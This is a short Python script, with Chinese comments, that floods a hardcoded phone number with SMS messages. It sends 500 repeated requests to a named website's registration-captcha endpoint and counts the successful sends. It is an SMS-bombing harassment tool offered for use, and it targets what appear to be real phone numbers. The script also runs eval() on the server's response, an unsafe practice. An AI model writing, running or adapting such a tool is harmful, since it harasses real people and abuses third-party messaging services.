# -- coding:utf-8 --

import requests
import datetime
import time
now = datetime.datetime.now()
start_time=now.strftime("%Y-%m-%d %H:%M:%S")

photo_num='13678447577'  #需要发送的号码
ci= 500 #需要发送的短信条数
m=0

#url='https://www.bybnb.com/account/getRegisterCaptcha?mobile=18689198574'
url='https://www.bybnb.com/account/getRegisterCaptcha?mobile={photo_num}'.format(photo_num=photo_num)
print('开始对号码：{hm} 发送短信，共发送{time}条短信。'.format(hm=photo_num,time=ci))
for n in range(1,ci+1):
    r = requests.get(url=url)
    b = eval(r.text)  ##b['status']
    print('第{ci}次 {zt}'.format(ci=str(n),zt=b['info'] ))
    if b['info']=='发送成功':
        m=n
    time.sleep(0.5)


end_time=now.strftime("%Y-%m-%d %H:%M:%S")
print('开始时间为：{}'.format(start_time))
print('结束时间为：{}'.format(end_time))
print('共发送成功{}次'.format(str(m)))


